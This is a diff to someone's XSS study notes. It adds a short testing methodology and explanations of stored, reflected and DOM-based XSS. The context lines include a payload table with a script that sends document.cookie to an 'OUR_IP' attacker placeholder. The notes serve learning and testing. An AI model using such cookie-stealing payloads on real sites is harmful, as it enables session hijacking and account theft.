@@ -15,8 +15,11 @@ XSS vulnerabilities take advantage of a flaw in user input sanitization to "writ
 - [Google Search XSS](https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/)
 - [Apache XSS](https://infra.apache.org/blog/apache_org_04_09_2010)
 
-# Methodology
-- [HackTricks](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html#methodology)
+# Methodology TLDR
+[HackTricks](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html#methodology)
+1. Check for any value or parameter you control (from input) is being REFLECTED in the page source or being USED by JavaScript in any of it's logic
+2. If reflected (serverside), find it's context (raw HTML / HTML tag / JS code or function) and depending on it's context will dictate what you can or can not do
+3. If used in client-side JavaScript, you could exploit a DOM XSS - pay attention how your input is controlled and if your controlled input is used by any sink.
 
 
 # XSS Testing Payloads
@@ -38,6 +41,19 @@ XSS vulnerabilities take advantage of a flaw in user input sanitization to "writ
 | Send Cookie details to us | `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>` |
 
 # Notes
+
+## Stored XSS
+Most critical where the injected XSS payload gets stored in the back-end database and retrieved upon visiting the page, this means that our XSS attack is persistent and may affect any user that visits the page.
+
+## Reflected XSS (Not stored)
+2 types, both non-persistent:
+- `Reflected` payload gets processed by the back-end server - server-side vulnerability
+- `DOM-based XSS` payload is completely processed on the client-side and never reaches the back-end server. Nothing in the network tab - therefore client-side vulnerabiltiy.
+
+### Difference between the two
+
+
+
 ## Same-Origin Policy (SOP) 
 Tries to set boundaries by preventing one origin (website) from accessing resources from another origin. A different origin is defined by something that has a different protocol (`http` vs `https`), domain (`example.com` vs `google.com`) and port (`80` vs `443`)
 
